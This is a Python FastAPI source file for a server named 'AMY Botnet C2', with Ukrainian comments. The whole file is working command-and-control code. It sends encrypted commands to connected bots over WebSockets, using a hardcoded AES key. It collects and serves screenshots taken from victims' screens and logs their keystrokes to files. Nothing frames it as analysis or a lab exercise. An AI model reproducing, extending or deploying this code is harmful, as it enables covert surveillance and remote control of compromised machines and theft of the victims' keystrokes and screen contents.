from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import FileResponse, Response
import asyncio
import base64
import os
from datetime import datetime

try:
    from Crypto.Cipher import AES
except ImportError:
    from Cryptodome.Cipher import AES

app = FastAPI(title="AMY Botnet C2")

# Шляхи
current_file_path = os.path.abspath(__file__)
project_root = os.path.dirname(os.path.dirname(current_file_path))
ui_path = os.path.join(project_root, "ui")

os.makedirs("screenshots", exist_ok=True)
os.makedirs("logs", exist_ok=True)

active_bots = {}
bot_responses = {}
# Сховище для останнього скріншота (бінарні дані)
last_screenshot_data = {} 

AES_KEY = b"AMY_BOTNET_2026_SECURE_KEY_V2_32" 

def decrypt_message(encoded: str) -> str:
    try:
        raw_data = base64.b64decode(encoded)
        nonce, tag, ciphertext = raw_data[:16], raw_data[16:32], raw_data[32:]
        cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except: return None

def encrypt_message(msg: str) -> str:
    cipher = AES.new(AES_KEY, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')

@app.get("/")
async def read_index():
    return FileResponse(os.path.join(ui_path, "index.html"))

@app.get("/bots")
async def list_bots():
    return {"bots": list(active_bots.keys())}

@app.get("/response/{bot_id}")
async def get_response(bot_id: str):
    res = bot_responses.pop(bot_id, "")
    if res.startswith("SCREENSHOT:"):
        # Повертаємо сигнал фронтенду, що картинка готова
        return {"response": "IMAGE_READY", "is_img": True}
    return {"response": res, "is_img": False}

@app.get("/view_screenshot/{bot_id}")
async def view_screenshot(bot_id: str):
    # Віддаємо чисте зображення з пам'яті
    data = last_screenshot_data.get(bot_id)
    if data:
        return Response(content=data, media_type="image/png")
    return Response(status_code=404)

@app.post("/command")
async def send_command(bot_id: str, command: str):
    if bot_id in active_bots:
        bot_responses[bot_id] = "Waiting for bot..." 
        await active_bots[bot_id].send_text(encrypt_message(command))
        return {"status": "success"}
    return {"status": "error", "message": "Bot offline"}

@app.websocket("/ws/{bot_id}")
async def websocket_endpoint(websocket: WebSocket, bot_id: str):
    await websocket.accept()
    active_bots[bot_id] = websocket
    try:
        while True:
            encrypted_data = await websocket.receive_text()
            data = decrypt_message(encrypted_data)
            if not data: continue
            
            if data.startswith("SCREENSHOT:"):
                img_bytes = base64.b64decode(data[11:])
                last_screenshot_data[bot_id] = img_bytes # Зберігаємо для API
                # Також дублюємо на диск
                fname = f"screenshots/{bot_id}_{datetime.now().strftime('%H%M%S')}.png"
                with open(fname, "wb") as f: f.write(img_bytes)
                bot_responses[bot_id] = "SCREENSHOT_LOADED"
            elif data.startswith("KEYLOG:"):
                with open(f"logs/{bot_id}.txt", "a") as f: f.write(data[7:])
            else:
                bot_responses[bot_id] = data
    except WebSocketDisconnect:
        if bot_id in active_bots: del active_bots[bot_id]
